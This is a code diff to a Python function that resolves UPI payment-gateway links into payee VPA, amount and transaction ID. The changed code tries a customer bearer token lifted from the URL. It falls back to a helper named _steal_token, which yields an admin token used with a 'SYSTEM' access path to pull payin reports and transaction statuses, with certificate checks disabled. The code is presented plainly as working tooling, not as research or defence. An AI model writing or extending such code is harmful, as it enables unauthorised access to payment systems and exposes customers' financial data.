@@ -309,60 +309,82 @@ def resolve_payment_url(url):
         gw_key = result["gw"] or "oneten"
         cfg = GATEWAYS.get(gw_key, GATEWAYS["oneten"])
         try:
-            stolen = _steal_token(gw_key)
-            if stolen and stolen[0]:
-                _tok, _usr = stolen
-                domain = cfg["domains"][0] if cfg.get("domains") else cfg["base"]
-                req_id = path_parts[2]
-                uuid_part = path_parts[1]
-                from datetime import datetime as _dt, timedelta as _td
-                _auth = {
-                    "User-Agent": "Mozilla/5.0",
-                    "Content-Type": "application/json",
-                    "Authorization": f"Bearer {_tok}",
-                    "client-id": _usr,
-                    "access-path": "SYSTEM",
-                }
-                # Search last 3 days
-                _today = _dt.now()
-                for day_offset in range(3):
-                    _d = (_today - _td(days=day_offset)).strftime("%Y-%m-%d")
-                    rpt = requests.post(
-                        f"{domain}/api/v1/upi/q/payin/report",
-                        json={"fromDate": _d, "toDate": _d},
-                        headers=_auth, verify=False, timeout=10
-                    )
-                    if rpt.status_code == 200:
-                        for line in rpt.text.strip().split('\n')[1:]:
-                            cols = line.split(',')
-                            if len(cols) > 7 and cols[3].strip() == req_id:
-                                result["vpa"] = cols[5].strip()
-                                try: result["amount"] = float(cols[7].strip())
-                                except: pass
-                                result["txn_id"] = cols[4].strip()
-                                result["request_id"] = cols[3].strip()
-                                break
-                    if result["vpa"]:
-                        break
-                
-                # Fallback: use txnId from report to get status, or guess from UUID
-                if not result["vpa"]:
-                    _txn_to_try = result.get("txn_id") or ""
-                    if not _txn_to_try:
-                        _txn_to_try = f"LI-{uuid_part}" if gw_key == "oneten" else f"MI-{uuid_part}"
-                    try:
-                        sr = requests.get(
-                            f"{domain}/api/v1/upi/q/payin/status/{_txn_to_try}",
-                            headers=_auth, verify=False, timeout=5
+            domain = cfg["domains"][0] if cfg.get("domains") else cfg["base"]
+            req_id = path_parts[2]
+            uuid_part = path_parts[1]
+            cust_token = path_parts[3].split("?")[0] if len(path_parts) > 3 else ""
+            
+            # Method 1: Validate endpoint with customer bearer token (direct, no admin needed)
+            if cust_token:
+                try:
+                    vr = requests.get(
+                        f"{domain}/api/v1/upi/payin/validate/{uuid_part}",
+                        headers={"User-Agent": "Mozilla/5.0", "Authorization": f"Bearer {cust_token}",
+                                 "client-id": req_id},
+                        verify=False, timeout=5)
+                    if vr.status_code == 200:
+                        vd = vr.json() if hasattr(vr, 'json') else json.loads(vr.text)
+                        if vd.get("vpa") or vd.get("accName"):
+                            result["vpa"] = vd.get("vpa") or vd.get("accName", "")
+                        if vd.get("amount") or vd.get("requestedAmount"):
+                            result["amount"] = float(vd.get("amount") or vd.get("requestedAmount", 0))
+                        if vd.get("txnId"):
+                            result["txn_id"] = vd["txnId"]
+                except Exception:
+                    pass
+            
+            # Method 2: Steal admin token and search
+            if not result["vpa"]:
+                stolen = _steal_token(gw_key)
+                if stolen and stolen[0]:
+                    _tok, _usr = stolen
+                    from datetime import datetime as _dt, timedelta as _td
+                    _auth = {
+                        "User-Agent": "Mozilla/5.0",
+                        "Content-Type": "application/json",
+                        "Authorization": f"Bearer {_tok}",
+                        "client-id": _usr,
+                        "access-path": "SYSTEM",
+                    }
+                    
+                    # 2a: Search payin report (full-text match on requestId)
+                    _today = _dt.now()
+                    for day_offset in range(3):
+                        _d = (_today - _td(days=day_offset)).strftime("%Y-%m-%d")
+                        rpt = requests.post(
+                            f"{domain}/api/v1/upi/q/payin/report",
+                            json={"fromDate": _d, "toDate": _d},
+                            headers=_auth, verify=False, timeout=10
                         )
-                        if sr.status_code == 200:
-                            sd = sr.json()
-                            if sd.get("requestedAmount"):
-                                result["amount"] = float(sd["requestedAmount"])
-                                result["vpa"] = sd.get("additional", {}).get("VPA", "")
-                                result["txn_id"] = sd.get("txnId", _txn_to_try)
-                                result["request_id"] = sd.get("header", {}).get("requestId", req_id)
-                    except: pass
+                        if rpt.status_code == 200:
+                            for line in rpt.text.strip().split('\n')[1:]:
+                                if req_id in line:
+                                    cols = line.split(',')
+                                    # Header: Date,Updated,Updated in,RequestId,TxnId,UTR,Requested Amt,...,Status
+                                    if len(cols) > 6:
+                                        result["txn_id"] = cols[4].strip()
+                                        result["request_id"] = req_id
+                                        try: result["amount"] = float(cols[6].strip())
+                                        except: pass
+                                    break
+                        if result.get("txn_id") and result["txn_id"] != uuid_part:
+                            break
+                    
+                    # 2b: Use txnId to get VPA+amount from status API
+                    _txn_to_try = result.get("txn_id", "")
+                    if _txn_to_try and _txn_to_try != uuid_part:
+                        try:
+                            sr = requests.get(
+                                f"{domain}/api/v1/upi/q/payin/status/{_txn_to_try}",
+                                headers=_auth, verify=False, timeout=5)
+                            if sr.status_code == 200:
+                                sd = sr.json()
+                                if sd.get("requestedAmount"):
+                                    result["amount"] = float(sd["requestedAmount"])
+                                    result["vpa"] = sd.get("additional", {}).get("VPA", "")
+                                    result["txn_id"] = sd.get("txnId", _txn_to_try)
+                                    result["request_id"] = sd.get("header", {}).get("requestId", req_id)
+                        except: pass
         except: pass
         
         if result["vpa"] and result["amount"]:
